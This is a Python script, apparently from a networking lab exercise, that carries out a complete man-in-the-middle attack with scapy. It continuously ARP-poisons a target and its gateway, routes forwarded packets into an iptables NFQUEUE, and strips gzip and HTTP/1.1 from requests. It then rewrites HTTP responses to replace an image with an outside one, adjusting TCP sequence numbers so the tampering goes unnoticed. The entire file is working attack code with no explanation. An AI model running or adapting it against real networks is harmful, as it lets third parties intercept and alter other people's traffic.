from scapy.all import sr, sendp, send, Raw
import multiprocessing
from scapy.layers.inet import IP, UDP, TCP
from scapy.layers.l2 import ARP, Ether
from time import sleep
import sys
from netfilterqueue import NetfilterQueue as NFQ
import subprocess

gateway_ip = "198.10.0.1"
target_ip = "198.10.0.2"

def get_mac(ip_address):
    # Given an IP, get the MAC.

    responses, _ = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=3, timeout=10, verbose=False)
    for _, r in responses:
        return r[ARP].hwsrc

    return None


def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    packet_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    
    packet_to_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)

    while True:
        sendp(packet_to_gateway, verbose=False)
        sendp(packet_to_target, verbose=False)
        sleep(2)

sessions = {}

def alter_packet(packet):
    global sessions

    if packet.haslayer(IP) and packet.haslayer(TCP):
        sport, dport = packet[TCP].sport, packet[TCP].dport
        src_ip, dst_ip = packet[IP].src, packet[IP].dst
        session_key = tuple(sorted([sport, dport])) + tuple(sorted([src_ip, dst_ip]))

        if session_key not in sessions:
            sessions[session_key] = {"byte_offset": 0}

        if sport == 80:
            # if http is sending to client (server container in this case)
            packet[TCP].seq += sessions[session_key]["byte_offset"]
        elif dport == 80:
            # if client (server container) is sending to http
            packet[TCP].ack -= sessions[session_key]["byte_offset"]
        
    if packet.haslayer(IP) and packet.haslayer(TCP) and packet.haslayer(Raw):
        sport, dport = packet[TCP].sport, packet[TCP].dport
        src_ip, dst_ip = packet[IP].src, packet[IP].dst
        session_key = tuple(sorted([sport, dport])) + tuple(sorted([src_ip, dst_ip]))
        payload_data = packet[Raw].load
        
        if dport == 80:
            if b"Accept-Encoding: gzip, deflate" in packet[Raw].load:
                packet[Raw].load = packet[Raw].load.replace(b"Accept-Encoding: gzip, deflate", b"Accept-Encoding: identity     ")
            if b"HTTP/1.1" in packet[Raw].load:
                packet[Raw].load = packet[Raw].load.replace(b"HTTP/1.1", b"HTTP/1.0")

        if sport == 80:
            search_query = b'src="unibuc_fisiere/header.jpg"'
            target_image = payload_data.find(search_query)
            
            if target_image != -1:
                new_data = payload_data.replace(b'src="unibuc_fisiere/header.jpg"', b'src="https://haveibeenpwned.com/Images/Hero.svg"')
                total_offset = len(new_data) - len(payload_data)

                sessions[session_key]["byte_offset"] += total_offset
                packet[Raw].load = new_data


    if packet.haslayer(IP):
        del packet[IP].len
        del packet[IP].chksum

    if packet.haslayer(TCP):
        del packet[TCP].chksum
    elif packet.haslayer(UDP):
        del packet[UDP].chksum

    return packet 

def process_packet(packet):
    bytes_ = packet.get_payload()
    scapy_packet = IP(bytes_)
    
    original_length = len(bytes_)
    
    scapy_packet = alter_packet(scapy_packet)
    
    modified_bytes = bytes(scapy_packet)
    
    if len(modified_bytes) != original_length:
        packet.drop()
        send(scapy_packet, verbose=False)
    else:
        packet.set_payload(modified_bytes)
        packet.accept()


if __name__ == "__main__":
    print("Starting script to poison ARP...")
    print(f"Gateway IP: {gateway_ip}")
    print(f"Target IP: {target_ip}")

    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print("Couldn't get gateway MAC. Exiting...")
        sys.exit(0)

    target_mac = get_mac(target_ip)
    if target_mac is None:
        print("Couldn't get target MAC. Exiting...")
        sys.exit(0)

    print(f"Gateway MAC: {gateway_mac}")
    print(f"Target MAC: {target_mac}")

    try:
        poison_process = multiprocessing.Process(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
        poison_process.daemon = True
        print("Poisoning ARP in background... (CTRL+C to exit)")
        poison_process.start()

        queue = NFQ()

        subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "5"], check=True)
        queue.bind(5, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("Exiting...")
    finally:
        subprocess.run(["iptables", "-D", "FORWARD", "-j", "NFQUEUE", "--queue-num", "5"], check=False)

        if poison_process.is_alive():
            poison_process.terminate()
            poison_process.join()

        print("Cleanup complete")